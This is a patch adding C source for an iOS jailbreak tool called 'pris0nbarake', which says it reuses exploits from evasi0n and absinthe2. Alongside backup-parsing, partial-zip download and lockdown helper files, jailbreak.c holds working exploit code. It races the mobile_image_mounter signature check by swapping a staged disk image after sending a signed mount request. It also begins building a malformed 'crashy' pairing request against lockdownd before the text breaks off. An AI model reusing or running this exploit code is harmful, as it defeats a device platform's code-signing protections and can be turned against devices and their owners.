+        ERROR("Allocation Error!!\n");
+        return NULL;
+    }
+    memcpy(mbdb->data, data, size);
+    mbdb->size = size;
+
+    mbdb->records = (mbdb_record_t **) malloc((mbdb->size / 64) * sizeof(mbdb_record_t));   // should be enough
+    mbdb->num_records = 0;
+
+    while (offset < mbdb->size) {
+        mbdb_record_t *rec = mbdb_record_parse(&(mbdb->data)[offset]);
+        if (!rec) {
+            ERROR("Unable to parse record at offset 0x%x!\n", offset);
+            break;
+        }
+        mbdb->records[mbdb->num_records++] = rec;
+        offset += rec->this_size;
+    }
+
+    return mbdb;
+}
+
+mbdb_t *mbdb_open(unsigned char *file)
+{
+    int err = 0;
+    unsigned int size = 0;
+    unsigned char *data = NULL;
+
+    mbdb_t *mbdb = NULL;
+
+    err = file_read(file, &data, &size);
+    if (err < 0) {
+        ERROR("Unable to read mbdb file\n");
+        return NULL;
+    }
+
+    mbdb = mbdb_parse(data, size);
+    if (mbdb == NULL) {
+        ERROR("Unable to parse mbdb file\n");
+        return NULL;
+    }
+
+    free(data);
+    return mbdb;
+}
+
+mbdb_record_t *mbdb_get_record(mbdb_t * mbdb, unsigned int index)
+{
+    return NULL;
+}
+
+void mbdb_free(mbdb_t * mbdb)
+{
+    if (mbdb) {
+        if (mbdb->header) {
+            free(mbdb->header);
+            mbdb->header = NULL;
+        }
+        if (mbdb->records) {
+            int i;
+            for (i = 0; i < mbdb->num_records; i++) {
+                mbdb_record_free(mbdb->records[i]);
+            }
+            free(mbdb->records);
+        }
+        if (mbdb->data) {
+            free(mbdb->data);
+        }
+        free(mbdb);
+    }
+}
+#include <curl/curl.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <inttypes.h>
+#include <zlib.h>
+#include <libgen.h>
+
+#include "partialcommon.h"
+#include "partial.h"
+
+static size_t dummyReceive(void* data, size_t size, size_t nmemb, void* info) {
+	return size * nmemb;
+}
+
+static size_t receiveCentralDirectoryEnd(void* data, size_t size, size_t nmemb, ZipInfo* info) {
+	memcpy(info->centralDirectoryEnd + info->centralDirectoryEndRecvd, data, size * nmemb);
+	info->centralDirectoryEndRecvd += size * nmemb;
+	return size * nmemb;
+}
+
+static size_t receiveCentralDirectory(void* data, size_t size, size_t nmemb, ZipInfo* info) {
+	memcpy(info->centralDirectory + info->centralDirectoryRecvd, data, size * nmemb);
+	info->centralDirectoryRecvd += size * nmemb;
+	return size * nmemb;
+}
+
+static size_t receiveData(void* data, size_t size, size_t nmemb, void** pFileData) {
+	memcpy(pFileData[0], data, size * nmemb);
+	pFileData[0] = ((char*)pFileData[0]) + (size * nmemb);
+	ZipInfo* info = ((ZipInfo*)pFileData[1]);
+	CDFile* file = ((CDFile*)pFileData[2]);
+	size_t* progress = ((size_t*)pFileData[3]);
+
+	if(progress) {
+		*progress += size * nmemb;
+	}
+
+	if(info && info->progressCallback && file) {
+		info->progressCallback(info, file, *progress);
+	}
+
+	return size * nmemb;
+}
+
+static CDFile* flipFiles(ZipInfo* info)
+{
+	char* cur = info->centralDirectory;
+
+	unsigned int i;
+	for(i = 0; i < info->centralDirectoryDesc->CDEntries; i++)
+	{
+		CDFile* candidate = (CDFile*) cur;
+		FLIPENDIANLE(candidate->signature);
+		FLIPENDIANLE(candidate->version);
+		FLIPENDIANLE(candidate->versionExtract);
+		// FLIPENDIANLE(candidate->flags);
+		FLIPENDIANLE(candidate->method);
+		FLIPENDIANLE(candidate->modTime);
+		FLIPENDIANLE(candidate->modDate);
+		// FLIPENDIANLE(candidate->crc32);
+		FLIPENDIANLE(candidate->compressedSize);
+		FLIPENDIANLE(candidate->size);
+		FLIPENDIANLE(candidate->lenFileName);
+		FLIPENDIANLE(candidate->lenExtra);
+		FLIPENDIANLE(candidate->lenComment);
+		FLIPENDIANLE(candidate->diskStart);
+		// FLIPENDIANLE(candidate->internalAttr);
+		// FLIPENDIANLE(candidate->externalAttr);
+		FLIPENDIANLE(candidate->offset);
+
+		cur += sizeof(CDFile) + candidate->lenFileName + candidate->lenExtra + candidate->lenComment;
+	}
+}
+
+ZipInfo* PartialZipInit(const char* url)
+{
+	ZipInfo* info = (ZipInfo*) malloc(sizeof(ZipInfo));
+	info->url = strdup(url);
+	info->centralDirectoryRecvd = 0;
+	info->centralDirectoryEndRecvd = 0;
+	info->centralDirectoryDesc = NULL;
+	info->progressCallback = NULL;
+
+	info->hIPSW = curl_easy_init();
+
+	curl_easy_setopt(info->hIPSW, CURLOPT_URL, info->url);
+	curl_easy_setopt(info->hIPSW, CURLOPT_FOLLOWLOCATION, 1);
+	curl_easy_setopt(info->hIPSW, CURLOPT_NOBODY, 1);
+	curl_easy_setopt(info->hIPSW, CURLOPT_WRITEFUNCTION, dummyReceive);
+
+	if(strncmp(info->url, "file://", 7) == 0)
+	{
+		char path[1024];
+		strcpy(path, info->url + 7);
+		char* filePath = (char*) curl_easy_unescape(info->hIPSW, path, 0,  NULL);
+		FILE* f = fopen(filePath, "rb");
+		if(!f)
+		{
+			curl_free(filePath);
+			curl_easy_cleanup(info->hIPSW);
+			free(info->url);
+			free(info);
+
+			return NULL;
+		}
+
+		fseek(f, 0, SEEK_END);
+		info->length = ftell(f);
+		fclose(f);
+
+		curl_free(filePath);
+	}
+	else
+	{
+		curl_easy_perform(info->hIPSW);
+
+		double dFileLength;
+		curl_easy_getinfo(info->hIPSW, CURLINFO_CONTENT_LENGTH_DOWNLOAD, &dFileLength);
+		info->length = dFileLength;
+	}
+
+	char sRange[100];
+	uint64_t start;
+
+	if(info->length > (0xffff + sizeof(EndOfCD)))
+		start = info->length - 0xffff - sizeof(EndOfCD);
+	else
+		start = 0;
+
+	uint64_t end = info->length - 1;
+
+	sprintf(sRange, "%" PRIu64 "-%" PRIu64, start, end);
+
+	curl_easy_setopt(info->hIPSW, CURLOPT_WRITEFUNCTION, receiveCentralDirectoryEnd);
+	curl_easy_setopt(info->hIPSW, CURLOPT_WRITEDATA, info);
+	curl_easy_setopt(info->hIPSW, CURLOPT_RANGE, sRange);
+	curl_easy_setopt(info->hIPSW, CURLOPT_HTTPGET, 1);
+
+	curl_easy_perform(info->hIPSW);
+
+	char* cur;
+	for(cur = info->centralDirectoryEnd; cur < (info->centralDirectoryEnd + (end - start - 1)); cur++)
+	{
+		EndOfCD* candidate = (EndOfCD*) cur;
+		uint32_t signature = candidate->signature;
+		FLIPENDIANLE(signature);
+		if(signature == 0x06054b50)
+		{
+			uint16_t lenComment = candidate->lenComment;
+			FLIPENDIANLE(lenComment);
+			if((cur + lenComment + sizeof(EndOfCD)) == (info->centralDirectoryEnd + info->centralDirectoryEndRecvd))
+			{
+				FLIPENDIANLE(candidate->diskNo);
+				FLIPENDIANLE(candidate->CDDiskNo);
+				FLIPENDIANLE(candidate->CDDiskEntries);
+				FLIPENDIANLE(candidate->CDEntries);
+				FLIPENDIANLE(candidate->CDSize);
+				FLIPENDIANLE(candidate->CDOffset);
+				FLIPENDIANLE(candidate->lenComment);
+				info->centralDirectoryDesc = candidate;
+				break;
+			}
+		}
+
+	}
+
+	if(info->centralDirectoryDesc)
+	{
+		info->centralDirectory = malloc(info->centralDirectoryDesc->CDSize);
+		start = info->centralDirectoryDesc->CDOffset;
+		end = start + info->centralDirectoryDesc->CDSize - 1;
+		sprintf(sRange, "%" PRIu64 "-%" PRIu64, start, end);
+		curl_easy_setopt(info->hIPSW, CURLOPT_WRITEFUNCTION, receiveCentralDirectory);
+		curl_easy_setopt(info->hIPSW, CURLOPT_WRITEDATA, info);
+		curl_easy_setopt(info->hIPSW, CURLOPT_RANGE, sRange);
+		curl_easy_setopt(info->hIPSW, CURLOPT_HTTPGET, 1);
+		curl_easy_perform(info->hIPSW);
+
+		flipFiles(info);
+
+		return info;
+	}
+	else 
+	{
+		curl_easy_cleanup(info->hIPSW);
+		free(info->url);
+		free(info);
+		return NULL;
+	}
+}
+
+CDFile* PartialZipFindFile(ZipInfo* info, const char* fileName)
+{
+	char* cur = info->centralDirectory;
+	unsigned int i;
+	for(i = 0; i < info->centralDirectoryDesc->CDEntries; i++)
+	{
+		CDFile* candidate = (CDFile*) cur;
+		const char* curFileName = cur + sizeof(CDFile);
+
+		if(strlen(fileName) == candidate->lenFileName && strncmp(fileName, curFileName, candidate->lenFileName) == 0)
+			return candidate;
+
+		cur += sizeof(CDFile) + candidate->lenFileName + candidate->lenExtra + candidate->lenComment;
+	}
+
+	return NULL;
+}
+
+CDFile* PartialZipListFiles(ZipInfo* info)
+{
+	char* cur = info->centralDirectory;
+	unsigned int i;
+	for(i = 0; i < info->centralDirectoryDesc->CDEntries; i++)
+	{
+		CDFile* candidate = (CDFile*) cur;
+		const char* curFileName = cur + sizeof(CDFile);
+		char* myFileName = (char*) malloc(candidate->lenFileName + 1);
+		memcpy(myFileName, curFileName, candidate->lenFileName);
+		myFileName[candidate->lenFileName] = '\0';
+
+		printf("%s: method: %d, compressed size: %d, size: %d\n", myFileName, candidate->method,
+				candidate->compressedSize, candidate->size);
+
+		free(myFileName);
+
+		cur += sizeof(CDFile) + candidate->lenFileName + candidate->lenExtra + candidate->lenComment;
+	}
+
+	return NULL;
+}
+
+unsigned char* PartialZipGetFile(ZipInfo* info, CDFile* file)
+{
+	LocalFile localHeader;
+	LocalFile* pLocalHeader = &localHeader;
+
+	uint64_t start = file->offset;
+	uint64_t end = file->offset + sizeof(LocalFile) - 1;
+	char sRange[100];
+	sprintf(sRange, "%" PRIu64 "-%" PRIu64, start, end);
+
+	void* pFileHeader[] = {pLocalHeader, NULL, NULL, NULL}; 
+
+	curl_easy_setopt(info->hIPSW, CURLOPT_URL, info->url);
+	curl_easy_setopt(info->hIPSW, CURLOPT_FOLLOWLOCATION, 1);
+	curl_easy_setopt(info->hIPSW, CURLOPT_WRITEFUNCTION, receiveData);
+	curl_easy_setopt(info->hIPSW, CURLOPT_WRITEDATA, &pFileHeader);
+	curl_easy_setopt(info->hIPSW, CURLOPT_RANGE, sRange);
+	curl_easy_setopt(info->hIPSW, CURLOPT_HTTPGET, 1);
+	curl_easy_perform(info->hIPSW);
+	
+	FLIPENDIANLE(localHeader.signature);
+	FLIPENDIANLE(localHeader.versionExtract);
+	// FLIPENDIANLE(localHeader.flags);
+	FLIPENDIANLE(localHeader.method);
+	FLIPENDIANLE(localHeader.modTime);
+	FLIPENDIANLE(localHeader.modDate);
+	// FLIPENDIANLE(localHeader.crc32);
+	FLIPENDIANLE(localHeader.compressedSize);
+	FLIPENDIANLE(localHeader.size);
+	FLIPENDIANLE(localHeader.lenFileName);
+	FLIPENDIANLE(localHeader.lenExtra);
+
+	unsigned char* fileData = (unsigned char*) malloc(file->compressedSize);
+	size_t progress = 0;
+	void* pFileData[] = {fileData, info, file, &progress}; 
+
+	start = file->offset + sizeof(LocalFile) + localHeader.lenFileName + localHeader.lenExtra;
+	end = start + file->compressedSize - 1;
+	sprintf(sRange, "%" PRIu64 "-%" PRIu64, start, end);
+
+	curl_easy_setopt(info->hIPSW, CURLOPT_WRITEFUNCTION, receiveData);
+	curl_easy_setopt(info->hIPSW, CURLOPT_WRITEDATA, pFileData);
+	curl_easy_setopt(info->hIPSW, CURLOPT_RANGE, sRange);
+	curl_easy_setopt(info->hIPSW, CURLOPT_HTTPGET, 1);
+	curl_easy_perform(info->hIPSW);
+
+	if(file->method == 8)
+	{
+		unsigned char* uncData = (unsigned char*) malloc(file->size);
+		z_stream strm;
+		strm.zalloc = Z_NULL;
+		strm.zfree = Z_NULL;
+		strm.opaque = Z_NULL;
+		strm.avail_in = 0;
+		strm.next_in = NULL;
+
+		inflateInit2(&strm, -MAX_WBITS);
+		strm.avail_in = file->compressedSize;
+		strm.next_in = fileData;
+		strm.avail_out = file->size;
+		strm.next_out = uncData;
+		inflate(&strm, Z_FINISH);
+		inflateEnd(&strm);
+		free(fileData);
+		fileData = uncData;
+	}
+	return fileData;
+}
+
+void PartialZipSetProgressCallback(ZipInfo* info, PartialZipProgressCallback progressCallback)
+{
+	info->progressCallback = progressCallback;
+}
+
+void PartialZipRelease(ZipInfo* info)
+{
+	curl_easy_cleanup(info->hIPSW);
+	free(info->centralDirectory);
+	free(info->url);
+	free(info);
+
+	curl_global_cleanup();
+}
+/**
+ * lockdown.c
+ * Copyright (C) 2010 Joshua Hill
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ **/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <libimobiledevice/lockdown.h>
+#include <libimobiledevice/libimobiledevice.h>
+
+#include "common.h"
+
+lockdown_t *lockdown_open(device_t * device)
+{
+    lockdownd_client_t lockdownd = NULL;
+    if (lockdownd_client_new_with_handshake(device->client, &lockdownd,
+                                            "pris0nbarake") !=
+        LOCKDOWN_E_SUCCESS) {
+        ERROR("Unable to pair with lockdownd\n");
+    }
+
+    lockdown_t *lockdown = (lockdown_t *) malloc(sizeof(lockdown_t));
+    if (lockdown == NULL) {
+        ERROR("Unable to allocate memory for lockdown object\n");
+    }
+    memset(lockdown, '\0', sizeof(lockdown_t));
+
+    lockdown->client = lockdownd;
+    lockdown->device = device;
+    return lockdown;
+}
+
+int lockdown_get_value(lockdown_t * lockdown, const char *domain,
+                       const char *key, plist_t * value)
+{
+    if (!lockdown || !lockdown->client) {
+        return -1;
+    }
+
+    lockdownd_error_t err = lockdownd_get_value(lockdown->client, domain, key,
+                                                value);
+    if (err == LOCKDOWN_E_SUCCESS) {
+        return 0;
+    } else {
+        return -1;
+    }
+}
+
+int lockdown_get_string(lockdown_t * lockdown, const char *key, char **value)
+{
+    if (!lockdown || !lockdown->client) {
+        return -1;
+    }
+
+    char *str = NULL;
+    plist_t pl = NULL;
+    lockdownd_error_t err =
+        lockdownd_get_value(lockdown->client, NULL, key, &pl);
+    if (err == LOCKDOWN_E_SUCCESS) {
+        if (pl != NULL && plist_get_node_type(pl) == PLIST_STRING) {
+            plist_get_string_val(pl, &str);
+            plist_free(pl);
+            if (str != NULL) {
+                *value = str;
+                return 0;
+            }
+        }
+    }
+    if (pl) {
+        plist_free(pl);
+    }
+    return -1;
+}
+
+int lockdown_start_service(lockdown_t * lockdown, const char *service,
+                           uint16_t * port)
+{
+    lockdownd_service_descriptor_t service_descriptor = NULL;
+    uint16_t p = 0;
+
+    lockdownd_start_service(lockdown->client, service, &service_descriptor);
+
+    if (!service_descriptor) {
+        WARN("%s failed to start.\n", service);
+        return -1;
+    }
+
+    p = service_descriptor->port;
+
+    if (p == 0) {
+        ERROR("%s failed to start!\n", service);
+        return -1;
+    }
+
+    DEBUG("Started %s successfully on port %d!\n", service, p);
+    *port = p;
+    return 0;
+}
+
+int lockdown_close(lockdown_t * lockdown)
+{
+    lockdownd_client_free(lockdown->client);
+    lockdown->client = NULL;
+    return 0;
+}
+
+void lockdown_free(lockdown_t * lockdown)
+{
+    if (lockdown) {
+        if (lockdown->client) {
+            lockdown_close(lockdown);
+        }
+        free(lockdown);
+    }
+}
+/**
+ * pris0nbarake - jailbreak.c
+ *
+ * Exploits from evasi0n and absinthe2. And others.
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ **/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <getopt.h>
+#include <dirent.h>
+
+#include <signal.h>
+#include <plist/plist.h>
+
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/errno.h>
+
+#include <assert.h>
+
+#include <libimobiledevice/libimobiledevice.h>
+#include <libimobiledevice/lockdown.h>
+#include <libimobiledevice/mobile_image_mounter.h>
+#include <libimobiledevice/mobilebackup2.h>
+#include <libimobiledevice/notification_proxy.h>
+#include <libimobiledevice/afc.h>
+#include <libimobiledevice/sbservices.h>
+#include <libimobiledevice/file_relay.h>
+#include <libimobiledevice/diagnostics_relay.h>
+
+#include <zlib.h>
+
+#include <fcntl.h>
+#include <sys/mman.h>
+
+#include "partialcommon.h"
+#include "partial.h"
+
+#include "common.h"
+
+#include "MobileDevice.h"
+
+#define AFCTMP 	"HackStore"
+
+typedef struct _compatibility {
+    char *product;
+    char *build;
+} compatibility_t;
+
+compatibility_t compatible_devices[] = {
+    {"N81AP", "10B400"},
+
+    {"N41AP", "10B350"},
+    {"N42AP", "10B350"},
+
+    {"N94AP", "10B329"},
+
+    {"N90BAP", "10B329"},
+    {"N90AP", "10B329"},
+    {"N92AP", "10B329"},
+    {"N81AP", "10B329"},
+    {"N88AP", "10B329"},
+
+    {"N78AP", "10B329"},
+
+    {"N41AP", "10B329"},
+    {"N42AP", "10B329"},
+
+    {"J1AP", "10B329"},
+    {"J2AP", "10B329"},
+    {"J2aAP", "10B329"},
+
+    {"P101AP", "10B329"},
+    {"P102AP", "10B329"},
+    {"P103AP", "10B329"},
+
+    {"K93AP", "10B329"},
+    {"K93AAP", "10B329"},
+    {"K94AP", "10B329"},
+    {"K95AP", "10B329"},
+
+    {"P105AP", "10B329"},
+    {"P106AP", "10B329"},
+    {"P107AP", "10B329"},
+
+    {NULL, NULL}
+};
+
+static int cpio_get_file_name_length(void *cpio)
+{
+    if (cpio) {
+        char buffer[7];
+        int val;
+
+        memset(buffer, '\0', 7);
+
+        memcpy(&buffer, (void *) (cpio + 59), 6);   /* File Name Length */
+
+        val = strtoul(buffer, NULL, 8);
+        return val;
+    } else {
+        return 0;
+    }
+}
+
+static int cpio_get_file_length(void *cpio)
+{
+    if (cpio) {
+        char buffer[12];
+        int val;
+
+        memset(buffer, '\0', 12);
+
+        memcpy(&buffer, (void *) (cpio + 65), 11);  /* File Length */
+
+        val = strtoul(buffer, NULL, 8);
+        return val;
+    } else {
+        return 0;
+    }
+}
+
+/* recursively remove path, including path */
+static void rmdir_recursive(const char *path)
+{                               /*{{{ */
+    if (!path) {
+        return;
+    }
+    DIR *cur_dir = opendir(path);
+    if (cur_dir) {
+        struct dirent *ep;
+        while ((ep = readdir(cur_dir))) {
+            if ((strcmp(ep->d_name, ".") == 0)
+                || (strcmp(ep->d_name, "..") == 0)) {
+                continue;
+            }
+            char *fpath = (char *) malloc(strlen(path) + 1 + strlen(ep->d_name) + 1);
+            if (fpath) {
+                struct stat st;
+                strcpy(fpath, path);
+                strcat(fpath, "/");
+                strcat(fpath, ep->d_name);
+
+                if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
+                    rmdir_recursive(fpath);
+                } else {
+                    if (remove(fpath) != 0) {
+                        DEBUG("could not remove file %s: %s\n", fpath, strerror(errno));
+                    }
+                }
+                free(fpath);
+            }
+        }
+        closedir(cur_dir);
+    }
+    if (rmdir(path) != 0) {
+        fprintf(stderr, "could not remove directory %s: %s\n", path, strerror(errno));
+    }
+}                               /*}}} */
+
+static void print_xml(plist_t node)
+{
+    char *xml = NULL;
+    uint32_t len = 0;
+    plist_to_xml(node, &xml, &len);
+    if (xml)
+        puts(xml);
+}
+
+/* char** freeing helper function */
+static void free_dictionary(char **dictionary)
+{                               /*{{{ */
+    int i = 0;
+
+    if (!dictionary)
+        return;
+
+    for (i = 0; dictionary[i]; i++) {
+        free(dictionary[i]);
+    }
+    free(dictionary);
+}                               /*}}} */
+
+/* recursively remove path via afc, (incl = 1 including path, incl = 0, NOT including path) */
+static int rmdir_recursive_afc(afc_client_t afc, const char *path, int incl)
+{                               /*{{{ */
+    char **dirlist = NULL;
+    if (afc_read_directory(afc, path, &dirlist) != AFC_E_SUCCESS) {
+        //fprintf(stderr, "AFC: could not get directory list for %s\n", path);
+        return -1;
+    }
+    if (dirlist == NULL) {
+        if (incl) {
+            afc_remove_path(afc, path);
+        }
+        return 0;
+    }
+
+    char **ptr;
+    for (ptr = dirlist; *ptr; ptr++) {
+        if ((strcmp(*ptr, ".") == 0) || (strcmp(*ptr, "..") == 0)) {
+            continue;
+        }
+        char **info = NULL;
+        char *fpath = (char *) malloc(strlen(path) + 1 + strlen(*ptr) + 1);
+        strcpy(fpath, path);
+        strcat(fpath, "/");
+        strcat(fpath, *ptr);
+        if ((afc_get_file_info(afc, fpath, &info) != AFC_E_SUCCESS) || !info) {
+            // failed. try to delete nevertheless.
+            afc_remove_path(afc, fpath);
+            free(fpath);
+            free_dictionary(info);
+            continue;
+        }
+
+        int is_dir = 0;
+        int i;
+        for (i = 0; info[i]; i += 2) {
+            if (!strcmp(info[i], "st_ifmt")) {
+                if (!strcmp(info[i + 1], "S_IFDIR")) {
+                    is_dir = 1;
+                }
+                break;
+            }
+        }
+        free_dictionary(info);
+
+        if (is_dir) {
+            rmdir_recursive_afc(afc, fpath, 0);
+        }
+        afc_remove_path(afc, fpath);
+        free(fpath);
+    }
+
+    free_dictionary(dirlist);
+    if (incl) {
+        afc_remove_path(afc, path);
+    }
+
+    return 0;
+}                               /*}}} */
+
+static int connected = 0;
+
+void jb_device_event_cb(const idevice_event_t * event, void *user_data)
+{
+    char *uuid = (char *) user_data;
+    DEBUG("device event %d: %s\n", event->event, event->udid);
+    if (uuid && strcmp(uuid, event->udid))
+        return;
+    if (event->event == IDEVICE_DEVICE_ADD) {
+        connected = 1;
+    } else if (event->event == IDEVICE_DEVICE_REMOVE) {
+        connected = 0;
+    }
+}
+
+static void idevice_event_cb(const idevice_event_t * event, void *user_data)
+{
+    jb_device_event_cb(event, user_data);
+}
+
+typedef struct __csstores {
+    uint32_t csstore_number;
+} csstores_t;
+
+static csstores_t csstores[16];
+static int num_of_csstores = 0;
+
+int check_consistency(char *product, char *build)
+{
+    // Seems legit.
+    return 0;
+}
+
+int verify_product(char *product, char *build)
+{
+    compatibility_t *curcompat = &compatible_devices[0];
+    while ((curcompat) && (curcompat->product != NULL)) {
+        if (!strcmp(curcompat->product, product) && !strcmp(curcompat->build, build))
+            return 0;
+        curcompat++;
+    }
+    return 1;
+}
+
+const char *lastmsg = NULL;
+static void status_cb(const char *msg, int progress)
+{
+    if (!msg) {
+        msg = lastmsg;
+    } else {
+        lastmsg = msg;
+    }
+    DEBUG("[%d%%] %s\n", progress, msg);
+}
+
+#ifndef __GUI__
+int main(int argc, char *argv[])
+{
+    device_t *device = NULL;
+    char *uuid = NULL;
+    char *product = NULL;
+    char *build = NULL;
+    int old_os = 0;
+
+    /********************************************************/
+    /*
+     * device detection 
+     */
+    /********************************************************/
+    if (!uuid) {
+        device = device_create(NULL);
+        if (!device) {
+            ERROR("No device found, is it plugged in?\n");
+            return -1;
+        }
+        uuid = strdup(device->uuid);
+    } else {
+        DEBUG("Detecting device...\n");
+        device = device_create(uuid);
+        if (device == NULL) {
+            ERROR("Unable to connect to device\n");
+            return -1;
+        }
+    }
+
+    DEBUG("Connected to device with UUID %s\n", uuid);
+
+    lockdown_t *lockdown = lockdown_open(device);
+    if (lockdown == NULL) {
+        ERROR("Lockdown connection failed\n");
+        device_free(device);
+        return -1;
+    }
+
+    if ((lockdown_get_string(lockdown, "HardwareModel", &product) != LOCKDOWN_E_SUCCESS)
+        || (lockdown_get_string(lockdown, "BuildVersion", &build) != LOCKDOWN_E_SUCCESS)) {
+        ERROR("Could not get device information\n");
+        lockdown_free(lockdown);
+        device_free(device);
+        return -1;
+    }
+
+    DEBUG("Device is a %s with build %s\n", product, build);
+
+    if (verify_product(product, build) != 0) {
+        ERROR("Device is not supported\n");
+        return -1;
+    }
+
+    plist_t pl = NULL;
+    lockdown_get_value(lockdown, NULL, "ActivationState", &pl);
+    if (pl && plist_get_node_type(pl) == PLIST_STRING) {
+        char *as = NULL;
+        plist_get_string_val(pl, &as);
+        plist_free(pl);
+        if (as) {
+            if (strcmp(as, "Unactivated") == 0) {
+                free(as);
+                ERROR("The attached device is not activated. You need to activate it before it can be used with this jailbreak.\n");
+                lockdown_free(lockdown);
+                device_free(device);
+                return -1;
+            }
+            free(as);
+        }
+    }
+
+    pl = NULL;
+    lockdown_get_value(lockdown, "com.apple.mobile.backup", "WillEncrypt", &pl);
+    if (pl && plist_get_node_type(pl) == PLIST_BOOLEAN) {
+        char c = 0;
+        plist_get_bool_val(pl, &c);
+        plist_free(pl);
+        if (c) {
+            ERROR("You have a device backup password set. You need to disable the backup password in iTunes.\n");
+            lockdown_free(lockdown);
+            device_free(device);
+            return -1;
+        }
+    }
+    lockdown_free(lockdown);
+    device_free(device);
+    device = NULL;
+
+    idevice_event_subscribe(idevice_event_cb, uuid);
+    jailbreak_device(uuid, status_cb);
+
+    return 0;
+}
+#endif
+
+static void plist_replace_item(plist_t plist, char *name, plist_t item)
+{
+    if (plist_dict_get_item(plist, name))
+        plist_dict_remove_item(plist, name);
+    plist_dict_insert_item(plist, name, item);
+}
+
+kern_return_t send_message(service_conn_t socket, CFPropertyListRef plist);
+CFPropertyListRef receive_message(service_conn_t socket);
+
+static char *real_dmg, *real_dmg_signature, *ddi_dmg;
+
+static void print_data(CFDataRef data)
+{
+    if (data == NULL) {
+        DEBUG("[null]\n");
+        return;
+    }
+    DEBUG("[%.*s]\n", (int) CFDataGetLength(data), CFDataGetBytePtr(data));
+}
+
+void qwrite(afc_connection * afc, const char *from, const char *to)
+{
+    DEBUG("Sending %s -> %s... ", from, to);
+    afc_file_ref ref;
+
+    int fd = open(from, O_RDONLY);
+    assert(fd != -1);
+    size_t size = (size_t) lseek(fd, 0, SEEK_END);
+    void *buf = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0);
+    assert(buf != MAP_FAILED);
+
+    AFCFileRefOpen(afc, to, 3, &ref);
+    AFCFileRefWrite(afc, ref, buf, size);
+    AFCFileRefClose(afc, ref);
+
+    DEBUG("done.\n");
+
+    close(fd);
+}
+
+int timesl, tries = 0;
+volatile int is_ddid = 0;
+
+#undef assert
+#define assert(x) (x)
+
+/* badcode is bad */
+static void cb2(am_device_notification_callback_info * info, void *foo)
+{
+    timesl = 1000;
+
+    struct am_device *dev;
+    DEBUG("... %x\n", info->msg);
+    if (is_ddid)
+        CFRunLoopStop(CFRunLoopGetCurrent());
+
+    if (info->msg == ADNCI_MSG_CONNECTED) {
+        dev = info->dev;
+        tries++;
+
+        if (tries >= 30) {
+            is_ddid = -1;
+            return;
+        }
+
+        AMDeviceConnect(dev);
+        assert(AMDeviceIsPaired(dev));
+        assert(!AMDeviceValidatePairing(dev));
+        assert(!AMDeviceStartSession(dev));
+
+        CFStringRef product = AMDeviceCopyValue(dev, 0, CFSTR("ProductVersion"));
+        assert(product);
+        UniChar first = CFStringGetCharacterAtIndex(product, 0);
+        int epoch = first - '0';
+ Retry:
+        printf(".");
+        fflush(stdout);
+
+        service_conn_t afc_socket = 0;
+        struct afc_connection *afc = NULL;
+        assert(!AMDeviceStartService(dev, CFSTR("com.apple.afc"), &afc_socket, NULL));
+        assert(!AFCConnectionOpen(afc_socket, 0, &afc));
+        assert(!AFCDirectoryCreate(afc, "PublicStaging"));
+
+        AFCRemovePath(afc, "PublicStaging/staging.dimage");
+        qwrite(afc, real_dmg, "PublicStaging/staging.dimage");
+        if (ddi_dmg)
+            qwrite(afc, ddi_dmg, "PublicStaging/ddi.dimage");
+
+        service_conn_t mim_socket1 = 0;
+        service_conn_t mim_socket2 = 0;
+        assert(!AMDeviceStartService(dev, CFSTR("com.apple.mobile.mobile_image_mounter"), &mim_socket1, NULL));
+        assert(mim_socket1);
+
+        CFPropertyListRef result = NULL;
+        CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(dict, CFSTR("Command"), CFSTR("MountImage"));
+        CFDictionarySetValue(dict, CFSTR("ImageType"), CFSTR("Developer"));
+
+        CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/var/mobile/Media/PublicStaging/staging.dimage"));
+        
+        int fd = open(real_dmg_signature, O_RDONLY);
+        assert(fd != -1);
+        uint8_t sig[128];
+        assert(read(fd, sig, sizeof(sig)) == sizeof(sig));
+        close(fd);
+
+        CFDictionarySetValue(dict, CFSTR("ImageSignature"), CFDataCreateWithBytesNoCopy(NULL, sig, sizeof(sig), kCFAllocatorNull));
+        send_message(mim_socket1, dict);
+        
+        if (ddi_dmg) {
+            DEBUG("sleep %d\n", timesl);
+            usleep(timesl);
+
+            assert(!AFCRenamePath(afc, "PublicStaging/ddi.dimage", "PublicStaging/staging.dimage"));
+        }
+
+        DEBUG("receive 1:\n");
+
+        result = receive_message(mim_socket1);
+        print_data(CFPropertyListCreateXMLData(NULL, result));
+
+        if (strstr(CFDataGetBytePtr(CFPropertyListCreateXMLData(NULL, result)), "ImageMountFailed")) {
+            timesl += 100;
+            goto Retry;
+        }
+
+        is_ddid = 1;
+        CFRunLoopStop(CFRunLoopGetCurrent());
+        fflush(stdout);
+    }
+}
+
+void stroke_lockdownd(device_t * device)
+{
+    plist_t crashy = plist_new_dict();
+    char *request = NULL;
+    unsigned int size = 0;
+    idevice_connection_t connection;
+    uint32_t magic;
+    uint32_t sent = 0;
+    plist_dict_insert_item(crashy, "Request", plist_new_string("Pair"));
